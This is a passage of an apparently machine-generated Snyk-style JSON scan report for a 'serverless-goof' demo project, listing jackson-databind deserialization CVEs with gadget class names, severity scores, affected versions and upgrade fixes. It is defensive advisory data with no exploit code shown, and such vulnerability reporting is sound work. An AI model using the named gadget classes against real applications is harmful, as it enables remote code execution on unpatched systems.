WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.4 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2662)\n",
      "disclosureTime": "2020-03-26T14:55:20Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0,2.9.10.4)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.4"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-561373",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-rf6r-2c4q-2vwg"
        ],
        "CVE": [
          "CVE-2020-10968"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-05-02T13:21:39.848654Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-03-26T14:55:20Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2662"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0,2.9.10.4)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.0.0,2.6.7.4)",
          "[2.7.0,2.9.10.4)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.4"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-03-31T08:36:41.369827Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It mishandles the interaction between serialization gadgets and typing, related to gadget `org.apache.openjpa.ee.WASRegistryManagedRuntime` (aka openjpa).\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.4 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/e2ba12d5d60715d95105e3e790fc234cfb59893d)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2670)\n- [PoC](https://github.com/Al1ex/CVE-2020-11113)\n",
      "disclosureTime": "2020-03-31T06:16:36Z",
      "exploit": "Proof of Concept",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0,2.9.10.4)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.4"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-561585",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-9vvp-fxw6-jcxr"
        ],
        "CVE": [
          "CVE-2020-11113"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-05-02T13:21:39.755787Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-03-31T06:16:36Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/e2ba12d5d60715d95105e3e790fc234cfb59893d"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2670"
        },
        {
          "title": "PoC",
          "url": "https://github.com/Al1ex/CVE-2020-11113"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0,2.9.10.4)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.9.10.4)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.4"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-03-31T09:28:18.821103Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It mishandles the interaction between serialization gadgets and typing, related to gadgets `org.apache.activemq.*` (aka activemq-jms, activemq-core, activemq-pool, and activemq-pool-jms).\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.4 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/c14c9f99ed030dbd1440129585f03440c8758a99)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2664)\n",
      "disclosureTime": "2020-03-31T06:16:37Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.4)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.4"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-561586",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-v3xw-c963-f5hc"
        ],
        "CVE": [
          "CVE-2020-11111"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-05-02T13:21:40.308804Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-03-31T06:16:37Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/c14c9f99ed030dbd1440129585f03440c8758a99"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2664"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.4)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.9.10.4)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.4"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-03-31T09:29:29.728517Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It mishandles the interaction between serialization gadgets and typing, related to gadget  `org.apache.commons.proxy.provider.remoting.RmiProvider` (aka apache/commons-proxy).\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.4 or higher.\n## References\n- [GItHub Commit](https://github.com/FasterXML/jackson-databind/commit/05d7e0e13f43e12db6a51726df12c8b4d8040676)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2666)\n",
      "disclosureTime": "2020-03-31T06:16:37Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.4)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.4"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-561587",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-58pp-9c76-5625"
        ],
        "CVE": [
          "CVE-2020-11112"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-05-02T13:21:43.982026Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-03-31T06:16:37Z",
      "references": [
        {
          "title": "GItHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/05d7e0e13f43e12db6a51726df12c8b4d8040676"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2666"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.4)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.9.10.4)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.4"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-04-08T10:55:38.169333Z",
      "credit": [
        "Tatu Saloranta"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It mishandles the interaction between serialization gadgets and typing, related to `org.apache.commons.jelly.impl.Embedded` (aka `commons-jelly`).\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.4 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2682)\n- [Medium Post](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2020-04-08T00:42:23Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.4)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.4"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-564887",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-h4rc-386g-6m85"
        ],
        "CVE": [
          "CVE-2020-11620"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2020-11-15T15:46:01.440316Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-04-08T00:42:23Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2682"
        },
        {
          "title": "Medium Post",
          "url": "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.4)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.9.10.4)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.4"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-04-08T10:59:04.995807Z",
      "credit": [
        "Tatu Saloranta"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It mishandles the interaction between serialization gadgets and typing, related to `org.springframework.aop.config.MethodLocatingFactoryBean` (aka `spring-aop`).\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.4 or higher.\n## References\n- [GitHub Issues](https://github.com/FasterXML/jackson-databind/issues/2680)\n- [Medium Post](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2020-04-08T00:42:25Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0,2.9.10.4)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.4"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-564888",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-27xj-rqx5-2255"
        ],
        "CVE": [
          "CVE-2020-11619"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-05-02T13:21:40.174222Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-04-08T00:42:25Z",
      "references": [
        {
          "title": "GitHub Issues",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2680"
        },
        {
          "title": "Medium Post",
          "url": "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0,2.9.10.4)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.9.10.4)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.4"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-05-29T15:36:30.302636Z",
      "credit": [
        "XuYuanzhen"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It is possible to conduct a Deserialization attack using the `com.sun.org.apache.xalan.internal.lib.sql.JNDIConnectionPool`  (`xalan2`) class gadget if polymorphic type handling is enabled and an application using this package allows user input which gets deserialized. \r\n\r\nNote: This vulnerability does not affect release `2.10.0` onward.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization 